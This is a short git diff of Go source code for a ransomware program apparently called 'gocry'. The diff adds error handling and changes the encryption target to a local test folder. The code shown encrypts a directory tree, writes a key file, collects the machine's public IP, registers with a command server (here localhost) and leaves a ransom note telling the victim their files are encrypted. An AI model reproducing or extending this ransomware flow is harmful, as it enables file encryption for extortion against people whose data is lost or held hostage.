@@ -14,7 +14,7 @@ import (
 	"golang.org/x/exp/errors/fmt"
 )
 
-var rootToEncrypt string = "./test"
+var rootToEncrypt string = "./test/"
 
 const message string = `
 Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
@@ -31,11 +31,15 @@ func main() {
 	}
 
 	crypt.EncryptRoot(rw.RootDir, rw.Key)
-	rw.WriteKeyFile()
+	if err := rw.WriteKeyFile(); err != nil {
+		log.Fatal(err)
+	}
 
 	rw.Data.GetPublicIP()
 	rw.Data.SendToServer("http://localhost:8080/register")
-	rw.CreateRansomInfoFile(message)
+	if err := rw.CreateRansomInfoFile(message); err != nil {
+		log.Fatal(err)
+	}
 
 	// Start an infnite loop which checks key validity. We start in a goroutine, since
 	// we want the user to be able to interact with the ransomware.
